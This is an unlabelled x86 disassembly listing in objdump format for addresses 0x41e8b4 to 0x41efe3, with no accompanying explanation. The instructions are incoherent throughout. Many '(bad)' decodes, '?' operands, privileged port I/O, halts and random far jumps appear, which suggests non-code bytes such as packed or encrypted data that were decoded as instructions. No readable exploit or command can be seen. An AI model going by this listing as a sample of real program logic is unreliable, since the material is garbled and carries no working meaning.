  41e8b4:	out    0xfb,eax
  41e8b6:	outs   dx,BYTE PTR ds:[esi]
  41e8b7:	daa    
  41e8b8:	sub    edi,eax
  41e8ba:	mov    bl,0xb6
  41e8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8bd:	push   eax
  41e8be:	sub    al,BYTE PTR [esi]
  41e8c0:	adc    BYTE PTR [eax-0x2a],dl
  41e8c3:	or     al,0xff
  41e8c5:	sbb    bh,bh
  41e8c7:	sbb    DWORD PTR [esi-0x4a],ebx
  41e8ca:	or     dl,ch
  41e8cc:	sti    
  41e8cd:	xchg   ebp,eax
  41e8ce:	outs   dx,BYTE PTR ds:[esi]
  41e8cf:	push   ebp
  41e8d0:	mov    eax,0x985a93bf
  41e8d5:	xor    eax,0x9008b32e
  41e8da:	out    dx,al
  41e8db:	push   es
  41e8dc:	xor    BYTE PTR [eax],0xd9
  41e8df:	add    ebp,DWORD PTR [eax+edi*8+0x6bbe458c]
  41e8e6:	sub    bh,BYTE PTR [ebx]
  41e8e8:	(bad)  
  41e8e9:	shl    edi,0xcb
  41e8ec:	or     BYTE PTR [edi-0x67788cc],dh
  41e8f2:	xchg   esi,eax
  41e8f3:	add    eax,0x1f2614c1
  41e8f8:	pop    edi
  41e8f9:	xlat   BYTE PTR ds:[ebx]
  41e8fa:	hlt    
  41e8fb:	sub    dl,BYTE PTR [edx+eax*8-0x6b]
  41e8ff:	(bad)
  41e902:	sub    eax,0x2c3c7b18
  41e907:	pushf  
  41e908:	add    eax,0x605971ff
  41e90d:	xor    DWORD PTR [bp-0x3e05],edx
  41e912:	sub    BYTE PTR [edx],cl
  41e914:	mov    ds:0x50bc7b53,eax
  41e919:	ja     0x41e91f
  41e91b:	jae    0x41e971
  41e91d:	cmp    al,0x5e
  41e91f:	cs inc esp
  41e921:	in     al,0xfc
  41e923:	push   ecx
  41e924:	push   eax
  41e925:	cwde   
  41e926:	add    dl,BYTE PTR [eax+eax*8-0x64]
  41e92a:	test   al,0xfd
  41e92c:	es sub eax,0xf4e56b77
  41e932:	dec    ebx
  41e933:	stc    
  41e934:	cmc    
  41e935:	imul   ebp,DWORD PTR [ecx],0x64
  41e938:	adc    BYTE PTR [eax],bh
  41e93a:	mov    esp,0x3f949ebb
  41e93f:	jne    0x41e9ba
  41e941:	mov    DWORD PTR ds:0x88176e0c,ecx
  41e947:	xor    BYTE PTR [eax],cl
  41e949:	jg     0x41e95f
  41e94b:	mov    ds:0x4465c0f8,al
  41e950:	call   0xc7f:0x7277c408
  41e957:	cmp    BYTE PTR [edx],dl
  41e959:	cmp    al,0x1
  41e95b:	out    dx,eax
  41e95c:	mov    fs,edx
  41e95e:	shl    BYTE PTR [ebp+0x617291e4],cl
  41e964:	xor    ecx,ecx
  41e966:	imul   eax,DWORD PTR [edx-0x43],0x6
  41e96a:	mov    ds:0x32c51717,eax
  41e96f:	out    dx,al
  41e970:	dec    edx
  41e971:	and    ecx,DWORD PTR [ecx+0x6d]
  41e974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e975:	sbb    al,0x45
  41e977:	push   edx
  41e978:	jge    0x41e9e9
  41e97a:	loope  0x41e9dc
  41e97c:	pop    ecx
  41e97d:	sub    BYTE PTR [edx+0xd],0xd3
  41e981:	neg    DWORD PTR [ebp+0x1b4b8db3]
  41e987:	jo     0x41e959
  41e989:	je     0x41e9bb
  41e98b:	push   ds
  41e98c:	mov    ch,0xc3
  41e98e:	cwde   
  41e98f:	out    0x1,al
  41e991:	shr    DWORD PTR [ecx],cl
  41e993:	xor    al,0xe5
  41e995:	sub    BYTE PTR ds:0xfc9d1ed3,al
  41e99b:	adc    eax,0xd9754c6c
  41e9a0:	add    bh,BYTE PTR [edi]
  41e9a2:	pop    esi
  41e9a3:	(bad)  [ebx-0x528d2a92]
  41e9a9:	inc    ecx
  41e9aa:	ficomp DWORD PTR [ebp+0x3348c1a4]
  41e9b0:	dec    ebx
  41e9b1:	dec    edx
  41e9b2:	xchg   edi,eax
  41e9b3:	jne    0x41ea1c
  41e9b5:	adc    BYTE PTR [ecx],ch
  41e9b7:	fisttp DWORD PTR [esi+0x50]
  41e9ba:	hlt    
  41e9bb:	int3   
  41e9bc:	sbb    eax,0x43018613
  41e9c1:	scas   eax,DWORD PTR es:[edi]
  41e9c2:	and    al,0x16
  41e9c4:	in     eax,0xe9
  41e9c6:	sbb    al,0x6b
  41e9c8:	push   cs
  41e9c9:	rol    BYTE PTR [edx-0x371758e1],1
  41e9cf:	arpl   WORD PTR [edi-0x62699529],ax
  41e9d5:	push   edi
  41e9d6:	outs   dx,DWORD PTR ds:[esi]
  41e9d7:	clc    
  41e9d8:	adc    eax,0xb03278a3
  41e9dd:	into   
  41e9de:	adc    BYTE PTR [edi+0x72],al
  41e9e1:	(bad)  
  41e9e2:	das    
  41e9e3:	sub    ah,BYTE PTR es:[ecx-0x3a]
  41e9e7:	cmp    eax,0x1db9d8ae
  41e9ec:	mov    WORD PTR [edx-0x30],fs
  41e9ef:	ins    DWORD PTR es:[edi],dx
  41e9f0:	pop    ss
  41e9f1:	call   0x1fcc:0x8b4f7679
  41e9f8:	daa    
  41e9f9:	jne    0x41ea27
  41e9fb:	cs pushf 
  41e9fd:	pusha  
  41e9fe:	hlt    
  41e9ff:	jmp    DWORD PTR [edi-0xa748e92]
  41ea05:	ins    BYTE PTR es:[edi],dx
  41ea06:	fisttp DWORD PTR [edx+0x6c9476e5]
  41ea0c:	xor    BYTE PTR [edi+ebp*2],bh
  41ea0f:	adc    dh,al
  41ea11:	mul    DWORD PTR [eax+edx*8-0x3984cc27]
  41ea18:	push   0xffffff81
  41ea1a:	iret   
  41ea1b:	les    ebp,FWORD PTR [edx]
  41ea1d:	pop    edi
  41ea1e:	into   
  41ea1f:	fwait
  41ea20:	cs loopne 0x41e9da
  41ea23:	int3   
  41ea24:	cmp    DWORD PTR [esi+0x2],ecx
  41ea27:	push   ebx
  41ea28:	pusha  
  41ea29:	clc    
  41ea2a:	daa    
  41ea2b:	stos   BYTE PTR es:[edi],al
  41ea2c:	fcom   DWORD PTR [eax-0x21]
  41ea2f:	cmp    bh,0x25
  41ea32:	cs xchg esp,eax
  41ea34:	dec    BYTE PTR [edi+0x20]
  41ea37:	pusha  
  41ea38:	rol    ah,1
  41ea3a:	push   0xffffffa0
  41ea3c:	sub    edx,edi
  41ea3e:	clc    
  41ea3f:	dec    eax
  41ea40:	scas   al,BYTE PTR es:[edi]
  41ea41:	jae    0x41ea42
  41ea43:	or     eax,0xd989915b
  41ea48:	out    0xad,al
  41ea4a:	pop    esi
  41ea4b:	add    eax,ecx
  41ea4d:	jmp    0x1a8a:0x593e935
  41ea54:	cwde   
  41ea55:	sub    al,0x95
  41ea57:	fdivr  QWORD PTR [edx+0x50]
  41ea5a:	les    esi,FWORD PTR ds:0x5f5de407
  41ea60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea61:	and    BYTE PTR [ebp-0x3a],ah
  41ea64:	test   BYTE PTR [edx-0x3e957752],al
  41ea6a:	pop    edx
  41ea6b:	bound  edx,QWORD PTR [edi-0xb88eb8d]
  41ea71:	fild   QWORD PTR [esp+esi*1-0x297d0b68]
  41ea78:	stos   BYTE PTR es:[edi],al
  41ea79:	nop
  41ea7a:	mov    edi,0x4cf16bf3
  41ea7f:	sbb    eax,esp
  41ea81:	and    eax,0x8ee72500
  41ea86:	xchg   ah,al
  41ea88:	int    0xd7
  41ea8a:	xcrypt-ctr (bad)
  41ea8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea8c:	pop    esp
  41ea8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea8e:	sti    
  41ea8f:	jmp    0x41ea9c
  41ea91:	popa   
  41ea92:	xchg   esp,eax
  41ea93:	fcom   QWORD PTR [esi-0x78fd6ced]
  41ea99:	pop    esp
  41ea9a:	icebp  
  41ea9b:	fdivr  QWORD PTR [ebp+0x60]
  41ea9e:	dec    esi
  41ea9f:	call   0x6be70f71
  41eaa4:	mov    ecx,0xa2d6306a
  41eaa9:	or     BYTE PTR [edx],al
  41eaab:	das    
  41eaac:	jb     0x41ea68
  41eaae:	and    BYTE PTR [ebx-0x64995293],al
  41eab4:	stos   DWORD PTR es:[edi],eax
  41eab5:	mov    edx,0x3fc144e2
  41eaba:	or     ebp,DWORD PTR [eax]
  41eabc:	mov    edx,0x91c92c6f
  41eac1:	jmp    0x41ea4a
  41eac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eac4:	add    BYTE PTR [esi+0x856689b],ch
  41eaca:	and    bl,BYTE PTR [ecx]
  41eacc:	js     0x41eae3
  41eace:	pop    es
  41eacf:	fadd   DWORD PTR [ecx+eax*1+0x6c4a6490]
  41ead6:	lods   al,BYTE PTR ds:[esi]
  41ead7:	retf   0x8d2a
  41eada:	dec    ebx
  41eadb:	xchg   ebx,eax
  41eadc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eadd:	sti    
  41eade:	leave  
  41eadf:	sub    DWORD PTR [ecx-0x7a],esi
  41eae2:	das    
  41eae3:	and    eax,0x56b403c3
  41eae8:	mov    ch,0x7e
  41eaea:	dec    eax
  41eaeb:	shr    BYTE PTR [ebx+0x5c],cl
  41eaee:	js     0x41eb5a
  41eaf0:	jbe    0x41eaa6
  41eaf2:	mov    ebp,0xc2962751
  41eaf7:	fucomip st,st(5)
  41eaf9:	mov    bl,0x3a
  41eafb:	es out dx,eax
  41eafd:	jno    0x41eaa5
  41eaff:	xor    al,0x11
  41eb01:	popf   
  41eb02:	mov    bh,0x2a
  41eb04:	fdiv   st,st(2)
  41eb06:	sbb    ecx,esp
  41eb08:	std    
  41eb09:	scas   al,BYTE PTR es:[edi]
  41eb0a:	shr    BYTE PTR [edi+eiz*4+0x4aa6f622],cl
  41eb11:	das    
  41eb12:	mov    bl,0xec
  41eb14:	cdq    
  41eb15:	out    0x2b,eax
  41eb17:	mul    bl
  41eb19:	pusha  
  41eb1a:	mov    BYTE PTR [esi-0x1b],bl
  41eb1d:	retf   
  41eb1e:	xchg   esp,eax
  41eb1f:	lods   eax,DWORD PTR ds:[esi]
  41eb20:	jno    0x41eaac
  41eb22:	mov    dh,0x9
  41eb24:	lahf   
  41eb25:	adc    eax,0xf14c7a30
  41eb2a:	dec    edx
  41eb2b:	or     ecx,DWORD PTR [esi+0x41b94819]
  41eb31:	fidiv  WORD PTR [eax+0x28]
  41eb34:	test   dh,0xba
  41eb37:	std    
  41eb38:	lods   eax,DWORD PTR ds:[esi]
  41eb39:	repz jg 0x41eb82
  41eb3c:	js     0x41eafd
  41eb3e:	cs or  al,0xee
  41eb41:	xchg   edx,eax
  41eb42:	jae    0x41eb29
  41eb44:	mov    ah,0xe3
  41eb46:	adc    BYTE PTR [esi],ch
  41eb48:	xor    eax,0x4234e7bb
  41eb4d:	mov    ch,0x13
  41eb4f:	out    dx,eax
  41eb50:	lods   eax,DWORD PTR ds:[esi]
  41eb51:	scas   eax,DWORD PTR es:[edi]
  41eb52:	xor    al,BYTE PTR [edi-0x2cc2b1f2]
  41eb58:	cmp    eax,0xe215828e
  41eb5d:	mov    ah,0xa1
  41eb5f:	test   BYTE PTR [ebp+0x301ce998],dh
  41eb65:	and    eax,0xe39acd63
  41eb6a:	and    eax,0x584b80f9
  41eb6f:	mov    eax,0x4833bcee
  41eb74:	and    dh,BYTE PTR [edi+0x22]
  41eb77:	and    ah,BYTE PTR ds:0x9e912b03
  41eb7d:	dec    esi
  41eb7e:	mov    WORD PTR [esi],?
  41eb80:	sbb    esp,DWORD PTR [edx+0x284cdef6]
  41eb86:	ror    esi,1
  41eb88:	popf   
  41eb89:	ja     0x41ebb8
  41eb8b:	dec    eax
  41eb8c:	jns    0x41eb23
  41eb8e:	addr16 loopne 0x41eb98
  41eb91:	sbb    ecx,DWORD PTR [edi]
  41eb93:	pushf  
  41eb94:	fstp   QWORD PTR [esi-0x41]
  41eb97:	(bad)  
  41eb98:	jns    0x41ec03
  41eb9a:	pop    es
  41eb9b:	pop    esp
  41eb9c:	dec    edx
  41eb9d:	test   BYTE PTR [eax-0xf7c29a0],al
  41eba3:	dec    edi
  41eba4:	in     eax,0xdd
  41eba6:	ret    0xa662
  41eba9:	in     al,dx
  41ebaa:	or     edi,esi
  41ebac:	ror    dh,0x59
  41ebaf:	das    
  41ebb0:	inc    eax
  41ebb1:	xor    eax,0xfe7e0fce
  41ebb6:	xchg   edi,eax
  41ebb7:	pop    esi
  41ebb8:	jae    0x41eb88
  41ebba:	cmp    ebx,DWORD PTR [edx+0x381bcd8d]
  41ebc0:	aas    
  41ebc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc2:	mov    cs,WORD PTR [esi-0x4]
  41ebc5:	push   edx
  41ebc6:	aam    0x5a
  41ebc8:	jge    0x41ebc2
  41ebca:	(bad)  
  41ebcc:	scas   eax,DWORD PTR es:[edi]
  41ebcd:	xor    eax,0x14b727bc
  41ebd2:	ins    DWORD PTR es:[edi],dx
  41ebd3:	stos   DWORD PTR es:[edi],eax
  41ebd4:	push   ss
  41ebd5:	arpl   WORD PTR [ebx],si
  41ebd7:	int3   
  41ebd8:	sub    DWORD PTR [ecx-0x1f2d5040],0xffffff8d
  41ebdf:	or     ecx,ebx
  41ebe1:	test   DWORD PTR [eax+0x6],esi
  41ebe4:	jl     0x41ebca
  41ebe6:	xor    ah,bh
  41ebe8:	imul   edx,DWORD PTR [di],0xec6a67f
  41ebef:	push   cs
  41ebf0:	inc    edx
  41ebf1:	or     eax,0x73d5a23f
  41ebf6:	cmp    eax,0x122d1afc
  41ebfb:	arpl   WORD PTR [ebp+0x1d],bp
  41ebfe:	lock sbb ah,dl
  41ec01:	iret   
  41ec02:	int    0x88
  41ec04:	pusha  
  41ec05:	aas    
  41ec06:	sbb    ah,bl
  41ec08:	fbld   TBYTE PTR [edx-0x2]
  41ec0b:	retf   0x7ca4
  41ec0e:	test   eax,0x9233603c
  41ec13:	ins    DWORD PTR es:[edi],dx
  41ec14:	je     0x41ebee
  41ec16:	push   0xffffffc1
  41ec18:	inc    edi
  41ec19:	sbb    eax,0xb65766b4
  41ec1e:	mov    eax,0xf5d79fe3
  41ec23:	jl     0x41ec4d
  41ec25:	push   ebx
  41ec26:	ret    0x7822
  41ec29:	jg     0x41ec87
  41ec2b:	fcomip st,st(3)
  41ec2d:	cmc    
  41ec2e:	dec    eax
  41ec2f:	inc    esp
  41ec30:	xor    edi,DWORD PTR [edi-0x118094e3]
  41ec36:	dec    esi
  41ec38:	sbb    ch,BYTE PTR [ecx+0x33]
  41ec3b:	pop    esp
  41ec3c:	push   cs
  41ec3d:	fsub   DWORD PTR [esi]
  41ec3f:	(bad)  
  41ec40:	sub    al,0x8c
  41ec42:	sbb    ebx,DWORD PTR [eax-0x6fc71f21]
  41ec48:	or     DWORD PTR [ebx-0x40c5e9b2],eax
  41ec4e:	aad    0x3a
  41ec50:	(bad)  
  41ec51:	push   ds
  41ec52:	fwait
  41ec53:	pop    edx
  41ec54:	or     eax,0x2a2be1b4
  41ec59:	call   DWORD PTR [ebx-0x49]
  41ec5c:	into   
  41ec5d:	sub    BYTE PTR [ebp+0x548ed355],dh
  41ec63:	xchg   esp,eax
  41ec64:	loope  0x41ecc7
  41ec66:	mov    ebx,cs
  41ec68:	repz in eax,dx
  41ec6a:	popf   
  41ec6b:	push   esp
  41ec6c:	addr16 int 0xda
  41ec6f:	retw   
  41ec71:	dec    esi
  41ec72:	shl    BYTE PTR [edx],1
  41ec74:	ins    DWORD PTR es:[edi],dx
  41ec75:	cmp    BYTE PTR [edx-0x54e06b25],bh
  41ec7b:	mov    ebx,0x2f76ed52
  41ec80:	adc    DWORD PTR [eax+edx*1],ecx
  41ec83:	jbe    0x41eca5
  41ec85:	mov    esi,0x561bc416
  41ec8a:	push   esp
  41ec8b:	das    
  41ec8c:	sub    BYTE PTR [esi-0x4a],bh
  41ec8f:	jecxz  0x41ec49
  41ec91:	int3   
  41ec92:	jp     0x41ecdd
  41ec94:	push   esi
  41ec95:	add    edi,DWORD PTR [eax-0x6494d5a4]
  41ec9b:	cmp    ah,BYTE PTR [ebx]
  41ec9d:	mov    eax,0xe25e038d
  41eca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eca3:	idiv   BYTE PTR [edx]
  41eca5:	test   BYTE PTR [ecx+0x20],0x61
  41eca9:	frstor ds:0x1937bf15
  41ecaf:	fld    TBYTE PTR [ebp+0x24d4fe17]
  41ecb5:	mov    ?,WORD PTR [edx-0x717dba91]
  41ecbb:	push   es
  41ecbc:	push   ds
  41ecbd:	sub    bh,BYTE PTR [edi+0x2c]
  41ecc0:	pop    ss
  41ecc1:	jne    0x41ece6
  41ecc3:	pop    esp
  41ecc4:	inc    edx
  41ecc5:	idiv   DWORD PTR [eax]
  41ecc7:	mov    BYTE PTR [ebp-0x2],dh
  41ecca:	mov    DWORD PTR [edi+ecx*1],ecx
  41eccd:	or     edx,DWORD PTR [ebx-0x625d5850]
  41ecd3:	mov    cl,0x1c
  41ecd5:	push   ds
  41ecd6:	(bad)  
  41ecd8:	add    DWORD PTR [edx],edx
  41ecda:	pop    ecx
  41ecdb:	in     eax,0x12
  41ecdd:	sub    esi,DWORD PTR [ecx+esi*2-0x47]
  41ece1:	test   al,0x38
  41ece3:	fs pop edi
  41ece5:	push   esp
  41ece6:	inc    esi
  41ece7:	sub    DWORD PTR [ebx+0xb],edi
  41ecea:	pop    es
  41eceb:	dec    esp
  41ecec:	les    ebp,FWORD PTR [ebp+0xc]
  41ecef:	jge    0x41ed5e
  41ecf1:	push   0x3fd0e432
  41ecf6:	dec    edi
  41ecf7:	fdivr  QWORD PTR [esi]
  41ecf9:	xchg   BYTE PTR [eax+eiz*8],cl
  41ecfc:	pop    ebx
  41ecfd:	pop    ebx
  41ecfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecff:	outs   dx,DWORD PTR ds:[esi]
  41ed00:	push   esp
  41ed01:	bt     DWORD PTR [ebx+0x4a],ebp
  41ed05:	hlt    
  41ed06:	aam    0xbf
  41ed08:	xor    ch,dl
  41ed0a:	loop   0x41ecc7
  41ed0c:	aas    
  41ed0d:	sub    al,0x4c
  41ed0f:	dec    edi
  41ed10:	xchg   edx,eax
  41ed11:	div    edi
  41ed13:	add    esp,DWORD PTR [ebx+0x13]
  41ed16:	fisubr DWORD PTR [ebp+0x7ac61dd]
  41ed1c:	ss loopne 0x41ed41
  41ed1f:	aaa    
  41ed20:	sub    eax,0x9adb9a7c
  41ed25:	jno    0x41eccd
  41ed27:	jg     0x41ed27
  41ed29:	imul   ecx,DWORD PTR [ebp+0xf],0x0
  41ed2d:	mov    BYTE PTR [ecx-0x1ed3e172],bh
  41ed33:	push   cs
  41ed34:	ss jbe 0x41ed15
  41ed37:	push   ds
  41ed38:	in     eax,0x64
  41ed3a:	mov    DWORD PTR [edi+0x2f],ebx
  41ed3d:	mov    edi,0x1a0518f5
  41ed42:	mov    esi,eax
  41ed44:	(bad)  
  41ed45:	mov    ecx,0xb6f69143
  41ed4a:	fild   DWORD PTR [edx-0x20e773e5]
  41ed50:	xor    al,0xe1
  41ed52:	pushf  
  41ed53:	scas   eax,DWORD PTR es:[edi]
  41ed54:	push   edi
  41ed55:	adc    DWORD PTR [ebp+0x249bfb83],edi
  41ed5b:	fmul   DWORD PTR [eax+0x4f022403]
  41ed61:	mov    al,ds:0x1a6c2513
  41ed66:	mov    dh,0xba
  41ed68:	inc    esi
  41ed69:	cmp    DWORD PTR [edi+0x5a],esi
  41ed6c:	cmp    al,0x9b
  41ed6e:	xor    DWORD PTR [ebx+0x35],edx
  41ed71:	retf   0x3de7
  41ed74:	ins    BYTE PTR es:[edi],dx
  41ed75:	(bad)  
  41ed76:	dec    eax
  41ed77:	fs jo  0x41ed44
  41ed7a:	pop    edi
  41ed7b:	inc    eax
  41ed7c:	push   ecx
  41ed7d:	mov    edi,0xc61d02e5
  41ed82:	xor    al,0x62
  41ed84:	pop    ebx
  41ed85:	aaa    
  41ed86:	cdq    
  41ed87:	aad    0x80
  41ed89:	dec    edx
  41ed8a:	jl     0x41ed71
  41ed8c:	mov    edi,0xc2841792
  41ed91:	out    0x1a,eax
  41ed93:	rol    DWORD PTR [eax-0x52],1
  41ed96:	test   BYTE PTR [bx+di],al
  41ed99:	pushf  
  41ed9a:	int    0xd6
  41ed9c:	into   
  41ed9d:	fadd   DWORD PTR [ecx-0x69c7d4d9]
  41eda3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eda4:	ret    0x24dd
  41eda7:	popf   
  41eda8:	inc    esp
  41eda9:	test   BYTE PTR [edi+0x56],ah
  41edac:	mov    al,ds:0x3cd49a58
  41edb1:	sbb    bl,bl
  41edb3:	dec    ebx
  41edb4:	mov    ebp,0xcb74cfd
  41edb9:	cmc    
  41edba:	(bad)  
  41edbb:	out    0x52,eax
  41edbd:	in     al,0xd2
  41edbf:	pop    esp
  41edc0:	jg     0x41ee21
  41edc2:	aas    
  41edc3:	iret   
  41edc4:	pop    edi
  41edc5:	or     ebp,DWORD PTR [eax]
  41edc7:	mov    ebx,?
  41edc9:	xor    BYTE PTR [ebx],0x9
  41edcc:	jge    0x41ede4
  41edce:	ret    0x289d
  41edd1:	pop    ds
  41edd2:	xchg   edx,eax
  41edd3:	or     al,BYTE PTR [edi]
  41edd5:	sub    eax,0xbadc41ea
  41edda:	popf   
  41eddb:	lods   al,BYTE PTR ds:[esi]
  41eddc:	cli    
  41eddd:	call   0x616a:0x934d2209
  41ede4:	push   ecx
  41ede5:	xchg   edi,eax
  41ede6:	cmp    eax,0x3e0ad6e2
  41edeb:	int3   
  41edec:	gs cli 
  41edee:	in     eax,0x75
  41edf0:	fs (bad) 
  41edf2:	ins    DWORD PTR es:[edi],dx
  41edf3:	or     edi,0xfffffffa
  41edf6:	(bad)  
  41edf8:	(bad)  
  41edf9:	ins    DWORD PTR es:[edi],dx
  41edfa:	dec    ecx
  41edfb:	jo     0x41ed9f
  41edfd:	cld    
  41edfe:	fcomp  QWORD PTR [eax-0x356a60aa]
  41ee04:	lea    esi,[edx-0x6c]
  41ee07:	sti    
  41ee08:	mov    eax,ds:0x2a56d645
  41ee0d:	fiadd  DWORD PTR [edi+0x620460b6]
  41ee13:	jnp    0x41ee35
  41ee15:	xor    DWORD PTR [eax-0x1e49c685],edi
  41ee1b:	int3   
  41ee1c:	pop    eax
  41ee1d:	xchg   ecx,eax
  41ee1e:	sbb    al,BYTE PTR [ecx]
  41ee20:	mov    eax,0xe24bbe42
  41ee25:	ds mov bl,0xec
  41ee28:	cmp    ah,BYTE PTR [edx-0x3]
  41ee2b:	jb     0x41edd3
  41ee2d:	in     eax,dx
  41ee2e:	inc    ebx
  41ee2f:	add    eax,0x4a26c291
  41ee34:	mov    ds:0x88e3601e,al
  41ee39:	push   ss
  41ee3a:	dec    edi
  41ee3b:	mov    edx,0xdb2feae3
  41ee40:	jmp    0xcae5:0xd14e9073
  41ee47:	aaa    
  41ee48:	sub    esp,eax
  41ee4a:	in     al,0xe5
  41ee4c:	pop    esi
  41ee4d:	jp     0x41eeba
  41ee4f:	imul   bh
  41ee51:	fisubr DWORD PTR [esi-0x765c28d4]
  41ee57:	je     0x41eeb8
  41ee59:	stc    
  41ee5a:	xchg   edi,eax
  41ee5b:	xor    eax,0x42abd487
  41ee60:	fwait
  41ee61:	mov    ebx,0xc67ced9a
  41ee66:	xlat   BYTE PTR ds:[ebx]
  41ee67:	int3   
  41ee68:	aad    0x3b
  41ee6a:	(bad)  
  41ee6c:	adc    DWORD PTR [ecx+0x43],eax
  41ee6f:	retf   0xb499
  41ee72:	jb     0x41ee82
  41ee74:	dec    ecx
  41ee75:	in     eax,dx
  41ee76:	push   esi
  41ee77:	mov    bl,BYTE PTR fs:[ebx+0x25]
  41ee7b:	lock push ebp
  41ee7d:	cmp    DWORD PTR [esi+edi*2+0x51],edx
  41ee81:	and    DWORD PTR [esp+edi*4-0xc689ec0],esp
  41ee88:	loopne 0x41eed0
  41ee8a:	clc    
  41ee8b:	xor    al,0xf2
  41ee8d:	shl    DWORD PTR [ecx],0x33
  41ee90:	int    0x44
  41ee92:	jmp    0x3837:0x4e5dd60f
  41ee99:	sbb    DWORD PTR [edi-0x728d2102],ecx
  41ee9f:	pop    esi
  41eea0:	int    0xbf
  41eea2:	sbb    al,BYTE PTR [edi-0x2c]
  41eea5:	mov    cl,0x10
  41eea7:	or     DWORD PTR [eax],0xbc2bbe31
  41eead:	push   esi
  41eeae:	bound  esi,QWORD PTR [ebp+0x50]
  41eeb1:	bnd jne 0x41eead
  41eeb4:	mov    DWORD PTR [ecx+0x60],ebp
  41eeb7:	outs   dx,DWORD PTR ds:[esi]
  41eeb8:	sbb    DWORD PTR [edi],ebp
  41eeba:	jl     0x41eeda
  41eebc:	loop   0x41ee7a
  41eebe:	push   es
  41eebf:	add    eax,DWORD PTR [esi]
  41eec1:	push   es
  41eec2:	add    BYTE PTR [ecx+edi*1],bl
  41eec5:	pop    eax
  41eec6:	call   0xb5e413c0
  41eecb:	lahf   
  41eecc:	dec    esp
  41eecd:	mov    ecx,0x44c2676e
  41eed2:	mov    bl,0xc8
  41eed4:	je     0x41eec5
  41eed6:	push   ss
  41eed7:	dec    ebx
  41eed8:	adc    eax,0x1bedb59b
  41eedd:	xchg   ebx,eax
  41eede:	cvtps2pi mm6,xmm0
  41eee1:	pop    es
  41eee2:	scas   eax,DWORD PTR es:[edi]
  41eee3:	pop    edx
  41eee4:	lds    edi,FWORD PTR [ebx+0x6f]
  41eee7:	(bad)  
  41eee8:	mov    cl,0x13
  41eeea:	int    0x91
  41eeec:	stos   BYTE PTR es:[edi],al
  41eeed:	push   ss
  41eeee:	push   edx
  41eeef:	adc    al,0x0
  41eef1:	outs   dx,DWORD PTR ds:[esi]
  41eef2:	mov    dl,0x28
  41eef4:	ins    BYTE PTR es:[edi],dx
  41eef5:	enter  0x7c9e,0x28
  41eef9:	cmp    DWORD PTR [ebp+0x5f0bc0ef],esi
  41eeff:	mov    bl,0xed
  41ef01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef02:	dec    esi
  41ef03:	push   esp
  41ef04:	retf   
  41ef05:	sbb    BYTE PTR [ebp-0x14bd054c],dl
  41ef0b:	mov    WORD PTR [eax-0x67],ds
  41ef0e:	mov    BYTE PTR [edx],cl
  41ef10:	mov    ecx,DWORD PTR [edi-0xead3d14]
  41ef16:	test   al,0xd8
  41ef18:	push   0xffffff9e
  41ef1a:	dec    ecx
  41ef1b:	inc    edi
  41ef1c:	jmp    0x92cc:0x96b30e80
  41ef23:	sub    ebp,DWORD PTR [ebx+0x61]
  41ef26:	or     BYTE PTR [ebp+eiz*1-0x4e8ebfc5],dh
  41ef2d:	jge    0x41eeb3
  41ef2f:	mov    eax,ds:0x44d64ddb
  41ef34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef35:	mov    ch,0xc2
  41ef37:	aas    
  41ef38:	pop    ebx
  41ef39:	and    al,0x83
  41ef3b:	xor    DWORD PTR fs:[eax+eax*4+0x25],esi
  41ef40:	mov    BYTE PTR [edi],ah
  41ef42:	shr    DWORD PTR [esi],0xae
  41ef45:	mov    ds:0xf5fa4b29,al
  41ef4a:	dec    edx
  41ef4b:	mov    eax,ds:0x35fdd117
  41ef50:	in     al,0x70
  41ef52:	xor    eax,0xbb2bf350
  41ef57:	mov    ebx,0x99b91398
  41ef5c:	push   cs
  41ef5d:	sar    ah,0x6
  41ef60:	ds push ebp
  41ef62:	inc    ecx
  41ef63:	jmp    0x41ef74
  41ef65:	pop    edi
  41ef66:	xchg   esi,eax
  41ef67:	cld    
  41ef68:	out    0x6,eax
  41ef6a:	clc    
  41ef6b:	lds    ebp,FWORD PTR [ecx-0x363b4ff6]
  41ef71:	xchg   ebp,eax
  41ef72:	iret   
  41ef73:	mov    edi,0xd15bddc9
  41ef78:	bound  esi,QWORD PTR [ebx+0x58da60d9]
  41ef7e:	div    BYTE PTR [edi]
  41ef80:	rcr    DWORD PTR [edx+edx*8-0x48ea5c4c],0xad
  41ef88:	pushf  
  41ef89:	sbb    al,0xaa
  41ef8b:	and    BYTE PTR [eax+0x40bef1e5],0x18
  41ef92:	push   ebp
  41ef93:	push   cs
  41ef94:	cmp    BYTE PTR [ebp+0x5b],bh
  41ef97:	push   cs
  41ef98:	mov    edi,0xdc827a5b
  41ef9d:	loop   0x41efc5
  41ef9f:	sbb    al,0x71
  41efa1:	(bad)  
  41efa2:	aas    
  41efa3:	call   0x8d8f:0x5adcd839
  41efaa:	or     eax,0xd58cbbaa
  41efaf:	cmp    al,0x39
  41efb1:	jge    0x41efcf
  41efb3:	fstp   DWORD PTR [ecx+0x1088eb76]
  41efb9:	cmp    al,0x62
  41efbb:	sub    ecx,DWORD PTR [ebp+0x2ef82169]
  41efc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc2:	sub    BYTE PTR [edi],0xc2
  41efc5:	inc    esi
  41efc6:	sti    
  41efc7:	cmp    dh,al
  41efc9:	fsubp  st(4),st
  41efcb:	cdq    
  41efcc:	inc    ecx
  41efcd:	rcr    DWORD PTR ds:0x464a8cf6,0x14
  41efd4:	adc    BYTE PTR [esi+0x351780ec],ch
  41efda:	repnz xor bl,BYTE PTR [eax+0x57]
  41efde:	xchg   edi,eax
  41efdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efe0:	pop    ecx
  41efe1:	sub    esi,DWORD PTR [eax]
  41efe3:	mov    edi,0x1ea2983d
